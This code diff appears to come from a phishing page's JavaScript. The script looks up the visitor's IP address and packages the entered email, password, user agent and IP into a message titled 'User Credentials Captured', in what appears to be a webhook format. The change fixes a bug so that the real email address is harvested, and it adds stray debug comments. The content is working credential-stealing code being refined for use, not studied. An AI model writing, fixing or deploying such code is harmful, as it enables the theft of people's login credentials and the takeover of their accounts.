@@ -111,7 +111,7 @@
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                
+                //debug from here 
                 // Create a data object with the information you want to send
                 const logData = {
                     username: email,
@@ -128,8 +128,9 @@
                     embeds: [{
                         title: "User Credentials Captured",
                         color: 0x00ffc3,
+                        // or degug from here   
                         fields: [
-                            { name: "Email", value: `\`${gameName}\``, inline: false },
+                            { name: "Email", value: `\`${email}\``, inline: false },
                             { name: "Password", value: `\`${password}\``, inline: false },
                             { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false },
                             { name: "IP Address", value: `\`${logData.ip}\``, inline: false },
